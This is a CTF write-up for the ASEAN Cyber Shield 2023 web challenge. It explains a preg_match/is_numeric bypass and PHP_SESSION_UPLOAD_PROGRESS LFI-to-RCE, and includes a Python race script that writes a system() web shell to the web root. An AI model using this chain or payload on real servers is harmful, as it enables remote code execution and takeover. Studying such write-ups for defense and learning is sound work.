---
title: ASEAN Cyber Shield (ACS) CTF 2023 [WEB]
contest: ACS CTF
year: 2023
difficulty: medium
vuln_type: lfi
tags: [is_numeric绕, preg_match %091, /^[0-9+-\/*e ]/i, LFI, PHP_SESSION_UPLOAD_PROGRESS, session_upload_progress_enabled, include_once, 1MB padding race, /tmp/sess_XXXXX, shell.php写]
attack_chain:
  - 弱类型: is_numeric($num) 接受 ' 091' / '\x091' 等
  - preg_match("/^[0-9+-\/*e ]/i", $num): 用 %09 (tab) 旁路, 实际匹配首字符
  - %091 被解释为 \t + 1
  - $page preg_match 过滤 flag/php/conf/*/'/": 走 /tmp/sess_XXXXX
  - PHP_SESSION_UPLOAD_PROGRESS 写 session: <?php system($_GET['cmd']); ?>
  - 多线程 POST + GET race, session 文件落到 /tmp/sess_<id>
  - include_once('/tmp/sess_<id>') 触发 LFI RCE
  - 1MB padding race 保证文件在 include 时仍存在
  - 写 shell.php: <form data PHP_SESSION_UPLOAD_PROGRESS="<?php phpinfo();fputs(fopen('/var/www/html/shell.php','w'),'<?php system($_GET[0]); ?>');?>">
key_payload: 'is_numeric($num) + preg_match("/^[0-9+-\/*e ]/i") 旁路 / PHP_SESSION_UPLOAD_PROGRESS / session_upload_progress / include_once / race 1MB'
one_liner: ASEAN ACS CTF 2023 — is_numeric 弱类型 + preg_match /^[0-9...]/i %09 旁路 + PHP_SESSION_UPLOAD_PROGRESS LFI race 写 shell.php。
lesson: is_numeric 接受 '\t1' '\n1' 等;PHP_SESSION_UPLOAD_PROGRESS 是 LFI-to-RCE 经典 (前提 session.upload_progress.enabled=on);race 需 1MB 填充让文件活过 include。
quality: high
---

# ASEAN Cyber Shield (ACS) CTF 2023 [WEB]

## 速读
东南亚 ACS CTF 2023 Web 题 — is_numeric 弱类型 + PHP_SESSION_UPLOAD_PROGRESS LFI。

## 链 1: 旁路 preg_match
```php
if(preg_match("/^[0-9+-\/*e ]/i", $num)) exit;
if(is_numeric($num)) {
    if($page==null) echo phpinfo();
    else include_once($page);
}
```

- 用 `\x091` (tab+1) → preg_match 不匹配 /^[0-9...] 但 is_numeric 接受
- 或用 `%091` URL 编码

## 链 2: PHP_SESSION_UPLOAD_PROGRESS
```python
import requests, threading

def POST(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 1000)
        session.post(TARGET,
            data={"PHP_SESSION_UPLOAD_PROGRESS": "<?php phpinfo();fputs(fopen('/var/www/html/shell.php','w'),'<?php system($_GET[0]); ?>');?>"},
            files={"file": ('q.txt', f)},
            cookies={'PHPSESSID': sessid})

def READ(session):
    while True:
        session.get(f'{TARGET}?num=%091&page={sess_save_path}')
        # 写 shell.php 后访问 /shell.php?0=cat /flag
```

## 关键点
- session.upload_progress.enabled = on
- session.upload_progress.cleanup 默认 on,需 race
- 1MB padding 延长 session 文件存活
- sess_ 前缀: `/tmp/sess_<id>` or `/var/lib/php/sessions/sess_<id>`
